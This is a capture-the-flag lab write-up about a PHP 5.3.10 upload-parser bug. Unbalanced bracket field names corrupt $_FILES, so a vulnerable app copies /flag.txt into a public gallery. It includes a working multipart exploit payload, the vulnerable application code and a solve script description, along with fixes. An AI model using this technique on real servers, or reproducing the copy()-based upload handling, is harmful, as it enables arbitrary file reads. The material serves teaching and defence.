# 01 — Corrupting Upload File Indices — Writeup

## TL;DR

PHP splices the `$_FILES` property name (`name`, `type`, `tmp_name`, `error`,
`size`) into the variable name it registers, and it picks between two
`snprintf()` formats based on whether the upload field name *ends* with `]`.
Up to PHP 5.3.10 the parser accepted field names with unbalanced brackets, so
`name="file[tmp_name]["` takes the "not an array" branch and produces
`file[tmp_name][[name]` — the property name ends up **after** the attacker's
index instead of before it. Four such parts forge a complete `$_FILES` row
whose `tmp_name` is a plain string of our choosing. PixelDrop's batch intake
path uses `copy()` instead of `move_uploaded_file()`, so it copies `/flag.txt`
straight into the public gallery.

Flag: `PHRACK{unbalanced_brackets_forge_the_files_array}`

## The bug

### How `$_FILES` keys are built

Everything happens in `main/rfc1867.c`, in `rfc1867_post_handler()`. For every
file part, PHP first decides whether the field name is an *array* field:

```c
/* is_arr_upload is true when name of file upload field
 * ends in [.*]
 * start_arr is set to point to 1st [ */
is_arr_upload = (start_arr = strchr(param,'[')) && (param[strlen(param)-1] == ']');

if (is_arr_upload) {
    array_len = strlen(start_arr);
    if (array_index) {
        efree(array_index);
    }
    array_index = estrndup(start_arr + 1, array_len - 2);
}
```

Note what that test actually is: *"the name contains a `[`"* **and** *"the name
ends with `]`"*. Nothing checks that the brackets pair up.

Then, for each of the five properties, PHP formats a variable name into `lbuf`
and hands it to `register_http_post_files_variable()`:

```c
/* Add $foo[tmp_name] */
if (is_arr_upload) {
    snprintf(lbuf, llen, "%s[tmp_name][%s]", abuf, array_index);
} else {
    snprintf(lbuf, llen, "%s[tmp_name]", param);
}
```

`abuf` is everything before the first `[`, `array_index` is everything between
the first `[` and the last `]`. So for a well-formed `name="file[0]"`:

| branch | formatted name | resulting variable |
|---|---|---|
| `is_arr_upload = 1` | `file[tmp_name][0]` | `$_FILES['file']['tmp_name'][0]` |

The property name is the **first** key. That is the shape every PHP program in
the world expects.

Now take `name="file[tmp_name]["`. It contains a `[`, but its last character is
`[`, not `]` — so `is_arr_upload` is **false** and the `else` branch runs with
the raw field name:

```
snprintf(lbuf, llen, "%s[tmp_name]", "file[tmp_name][")
  ->  "file[tmp_name][[tmp_name]"
```

`php_register_variable_ex()` parses that as `file` → `tmp_name` → `[tmp_name`
(the index runs from the character after the `[` to the last `]`, and PHP is
happy for a key to contain a `[`). The property name has moved to the **last**
position, and the attacker owns the position in front of it.

Doing that for all five properties of a single part gives:

```
$_FILES['file']['tmp_name']['[name']      = basename(filename=)      <- attacker string
$_FILES['file']['tmp_name']['[type']      = Content-Type of the part <- attacker string
$_FILES['file']['tmp_name']['[tmp_name']  = /tmp/phpXXXXXX
$_FILES['file']['tmp_name']['[error']     = 0
$_FILES['file']['tmp_name']['[size']      = number of bytes posted
```

One part therefore writes *one* top-level property of `$_FILES['file']`, and
fills it with five sub-keys — the exact opposite of the normal layout.

### Which values are actually attacker-controlled

Two of the five:

* `[name]` — the `filename=` parameter, but PHP runs it through `basename()`
  first (`s = _basename(internal_encoding, filename)`), so no `/` survives.
* `[type]` — the part's `Content-Type` header, taken verbatim except that
  everything from the first `;` is chopped off ("fix for Opera 6.01").

`Content-Type` is the interesting one: it is a raw string, slashes included.
That is the slot we use to smuggle `/flag.txt`.

### The fix, and which versions are affected

PHP 5.3.11 added four lines right after the bracket-scanning loop that already
existed under the comment *"New Rule: never repair potential malicious user
input"*:

```c
/* Brackets should always be closed */
if(c != 0) {
    skip_upload = 1;
}
```

From then on any field name whose brackets do not balance makes PHP drop the
part entirely. Since a *balanced* name that contains `[` necessarily ends with
`]`, `is_arr_upload` can no longer be false for a bracketed name, and the two
`snprintf()` branches can no longer disagree.

Measured on this machine, with the payload from this lab:

| PHP | `$_FILES` after the payload |
|---|---|
| 5.3.10 (built here) | forged structure, see below |
| 5.6.24 | `array(0) { }` |
| 7.0.9 | `array(0) { }` |
| 7.4.33 | `array(0) { }` |
| 8.2.33 | `array(0) { }` |

So the lab is pinned to **PHP 5.3.10**, the last release with the bug. No
official `php:*` Docker image predates 5.3.29, so `challenge/Dockerfile` builds
the interpreter from the museum.php.net tarball (SHA-256 pinned) and serves it
through Apache's CGI handler.

### The vulnerable application

`challenge/src/index.php` branches on the *shape* of `$_FILES`, which is the
realistic version of this bug:

```php
if (!is_array($f['tmp_name'])) {
    /* single drop from the browser form */
    $report[] = accept_one($f['tmp_name'], $f['name'], $f['size'], $f['error'], true);
} else {
    /* batch drop from the desktop uploader */
    foreach ($f['tmp_name'] as $k => $tmp) {
        $report[] = '[' . $k . '] ' . accept_one(
            $tmp, pick($f['name'], $k), pick($f['size'], $k), pick($f['error'], $k), false
        );
    }
}
```

and `$strict = false` is the legacy path:

```php
if ($strict) {
    if (!is_uploaded_file($tmp)) {
        return 'rejected: not an uploaded file';
    }
    if (!move_uploaded_file($tmp, $dest)) { ... }
} else {
    /* legacy batch intake */
    if (!@copy($tmp, $dest)) { ... }
}
```

`copy()` has no idea what an uploaded file is. It will read anything the Apache
user can read.

## Building the exploit

### Step 1 — see the corruption

A throwaway script that only does `var_dump($_FILES)`, driven through the CGI
binary:

```sh
$ printf '%s' "$BODY" | REQUEST_METHOD=POST REDIRECT_STATUS=200 \
    SCRIPT_FILENAME=/w/d.php CONTENT_LENGTH=$CL \
    CONTENT_TYPE='multipart/form-data; boundary=----B' /opt/php53/bin/php-cgi
```

with a single part named `f[`:

```
array(1) {
  ["f"]=>
  array(5) {
    ["[name"]=>     string(5) "a.txt"
    ["[type"]=>     string(10) "text/plain"
    ["[tmp_name"]=> string(14) "/tmp/phpVZI5d8"
    ["[error"]=>    int(0)
    ["[size"]=>     int(4)
  }
}
```

There it is: the five property names have become *sub*-keys, prefixed with the
stray `[`. On 5.6 and later the same request yields `array(0) { }`.

### Step 2 — reproduce the paper

Adam Iwaniuk's original example uses `file[[size]` and `file[size][` together:

```
array(1) {
  ["file"]=>
  array(5) {
    ["name"]=>     array(1) { ["[size"]=> string(8) "file.txt" }
    ["type"]=>     array(1) { ["[size"]=> string(10) "text/plain" }
    ["tmp_name"]=> array(1) { ["[size"]=> string(14) "/tmp/phpkhAZvs" }
    ["error"]=>    array(1) { ["[size"]=> int(0) }
    ["size"]=>     array(5) {
      ["[size"]=>     int(4)
      ["[name"]=>     string(9) "file2.txt"
      ["[type"]=>     string(10) "text/plain"
      ["[tmp_name"]=> string(14) "/tmp/phpOgkRw6"
      ["[error"]=>    int(0)
    }
  }
}
```

`file[[size]` *is* an array field (it ends with `]`), so it produces the normal
layout with index `[size`. `file[size][` is not, so it lands underneath
`$_FILES['file']['size']` and desynchronises the parallel arrays. That is the
"size of one file, name of another" primitive from the paper.

### Step 3 — build a fully controlled row

The paper's shape desynchronises the arrays; we want something stronger — a row
where *every* value is a string we picked. Send one part per property, and read
all four values out of the `[type` sub-key, because `Content-Type` is the slot
PHP does not sanitise:

```
--B
Content-Disposition: form-data; name="file[tmp_name]["; filename="pad"
Content-Type: /flag.txt

x
--B
Content-Disposition: form-data; name="file[name]["; filename="pad"
Content-Type: loot.png

x
--B
Content-Disposition: form-data; name="file[size]["; filename="pad"
Content-Type: 1024

x
--B
Content-Disposition: form-data; name="file[error]["; filename="pad"
Content-Type: 0

x
--B--
```

which gives, for `$k = '[type'`:

```
k=[name        tmp=x                  name=x          size=x     err=x
k=[type        tmp=/flag.txt          name=loot.png   size=1024  err=0
k=[tmp_name    tmp=/tmp/phpODVlnj     name=/tmp/...   size=/tmp/... err=/tmp/...
k=[error       tmp=0                  name=integer    size=0     err=0
k=[size        tmp=1                  name=integer    size=1     err=1
```

The `[type` row walks through every check in `accept_one()`:

* `$err != UPLOAD_ERR_OK` — `"0" != 0` is false, so it passes.
* `name_ok("loot.png")` — basename-clean, matches `[A-Za-z0-9._-]{1,64}`,
  extension in the `png/jpg/gif` whitelist.
* `size_ok("1024")` — numeric, `0 < 1024 <= 65536`.
* `copy("/flag.txt", "/var/www/html/uploads/loot.png")` — no
  `is_uploaded_file()` in sight.

The other four rows fail the extension check and are reported as rejected,
which is exactly what the live run prints:

```
[+] intake report        : [[name] rejected: only png/jpg/gif artwork is accepted
[+] intake report        : [[type] stored as uploads/loot.png
[+] intake report        : [[tmp_name] rejected: only png/jpg/gif artwork is accepted
[+] intake report        : [[error] rejected: only png/jpg/gif artwork is accepted
[+] intake report        : [[size] skipped: upload error
```

### Step 4 — collect

```
GET /uploads/loot.png
PHRACK{unbalanced_brackets_forge_the_files_array}
```

The uploads directory is configured with `RemoveHandler`/`RemoveType`/
`ForceType text/plain`, so the copied file is served as inert text.

## The exploit

`solve/solve.py` is Python 3 standard library only and does exactly the four
steps above:

1. `part()` emits one `multipart/form-data` file part with a chosen field name,
   `filename=` and, crucially, a chosen `Content-Type`.
2. `build_body()` assembles the four parts — `file[tmp_name][`, `file[name][`,
   `file[size][`, `file[error][` — carrying `/flag.txt`, `loot.png`, `1024`
   and `0` respectively.
3. It POSTs the body to `/`, parses the intake report out of the HTML and
   asserts that the `[type` row was stored.
4. It fetches `/uploads/loot.png` and prints the flag.

Run it standalone with `python3 solve/solve.py http://127.0.0.1:8001`, or as
the compose service with `make solve`.

## Fixing it

**The application.** Three independent mistakes, any one of which would have
been enough:

1. *Never* open a path out of `$_FILES` without `is_uploaded_file()`. That
   function exists precisely so that a corrupted, injected or confused
   `$_FILES` cannot turn into an arbitrary file read. `move_uploaded_file()`
   performs the check internally; `copy()`, `fopen()`, `file_get_contents()`,
   `getimagesize()`, `finfo_file()` and friends do not.

   ```php
   if (!is_uploaded_file($tmp)) {
       return 'rejected: not an uploaded file';
   }
   if (!move_uploaded_file($tmp, $dest)) { ... }
   ```

2. Do not branch on the *shape* of `$_FILES`. Decide up front whether the
   endpoint is single or multi, then assert that shape:

   ```php
   $f = $_FILES['file'];
   foreach (array('name','type','tmp_name','error','size') as $k) {
       if (!isset($f[$k]) || !is_string($f[$k])) {  // single-file endpoint
           http_response_code(400);
           exit('malformed upload');
       }
   }
   ```

   On PHP 8.1+ `$_FILES` also carries `full_path`; iterate a known key list
   rather than whatever PHP handed you.

3. Validate the *destination*, and derive it yourself. A caller-supplied
   `name` should never reach the filesystem: hash the content, or use a
   generated identifier plus an extension you inferred from real content
   sniffing.

**The platform.** Run a supported PHP. This specific parser bug died in 5.3.11
(2012); the whole 5.x line has been end-of-life since 2018.

## Going further

- Reproduce the *other* half of Iwaniuk's paper: instead of forging a whole
  row, desynchronise `name` and `tmp_name` between two legitimate-looking
  parts, so a loop validates one file and stores a different one. That version
  survives code that *does* call `is_uploaded_file()` on a real temp file but
  writes it under the wrong name.
- The `filename=` value is only `basename()`-ed, so on a Windows host the path
  separator situation is very different — that is the subject of chapter 3 of
  the Phrack article.
- Type-confusing `$_FILES` is still alive on modern PHP even though this parser
  bug is not: `name="f"` and `name="f[0]"` in the same request make
  `$_FILES['f']['name']` flip between `string` and `array`, and plenty of
  validation code does not survive that. Try it against 8.2 and see which of
  `pathinfo()`, `preg_match()` and `strtolower()` throw, warn, or silently
  return the wrong thing.
- `MAX_FILE_SIZE` is an ordinary form field that PHP itself parses. Uploads
  that exceed it get `error = 2` and an empty `tmp_name` — another way to reach
  code paths the author never tested.

## References

- Adam Iwaniuk, *"Overriding $_FILES array during uploading multiple files in
  php"*, March 2011. Original PDF (now offline) —
  <https://students.mimuw.edu.pl/~ai292615/php_multipleupload_overwrite.pdf>,
  archived copy:
  <https://web.archive.org/web/20120111180547id_/https://students.mimuw.edu.pl/~ai292615/php_multipleupload_overwrite.pdf>
- Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*,
  Phrack #72 (2025), chapter 1 intro, reference [15] —
  <https://phrack.org/issues/72/5_md>
- PHP source, `main/rfc1867.c` (vulnerable):
  <https://github.com/php/php-src/blob/php-5.3.10/main/rfc1867.c>
- PHP source, `main/rfc1867.c` (fixed, note the "Brackets should always be
  closed" guard):
  <https://github.com/php/php-src/blob/php-5.3.11/main/rfc1867.c>
- PHP manual, `is_uploaded_file()`:
  <https://www.php.net/manual/en/function.is-uploaded-file.php>
